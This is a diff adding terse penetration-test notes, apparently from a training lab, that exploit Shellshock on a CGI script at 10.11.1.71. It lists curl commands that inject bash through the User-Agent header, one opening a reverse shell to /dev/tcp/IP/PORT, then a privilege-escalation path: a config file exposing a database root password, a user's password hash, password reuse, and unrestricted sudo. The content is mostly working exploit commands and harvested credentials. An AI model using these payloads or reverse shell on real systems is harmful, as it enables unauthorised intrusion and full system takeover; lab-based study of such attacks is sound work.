@@ -1,0 +1,29 @@
+The target is vulnerable to the "ShellShock" vulnerability using the URL: http://10.11.1.71/cgi-bin/admin.cgi.
+
+https://github.com/mubix/shellshocker-pocs
+
+
+curl -v http://10.11.1.71/cgi-bin/admin.cgi -s >/dev/null
+curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://10.11.1.71/cgi-bin/admin.cgi
+
+curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  bash -i >& /dev/tcp/IP/PORT 0>&1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'
+
+privesc:
+
+cat /var/www/html/templates/config.php
+
+$bigtree["config"]["db"]["host"] = "localhost";
+	$bigtree["config"]["db"]["name"] = "wingnut";
+	$bigtree["config"]["db"]["user"] = "root";
+	$bigtree["config"]["db"]["password"] = "zaq1xsw2cde3";
+	$bigtree["config"]["sql_interface"] = "mysqli"; // Change to "mysql" to use legacy MySQL interface in PHP.
+
+
+gibson@nobrains.com $P$BR2C9zC2Aau72.4cNZfJPC.iV8Ppj41
+
+
+dbpass is gibson password!
+
+gibson@alpha:~$ sudo -l
+User gibson may run the following commands on alpha:
+    (ALL : ALL) ALL
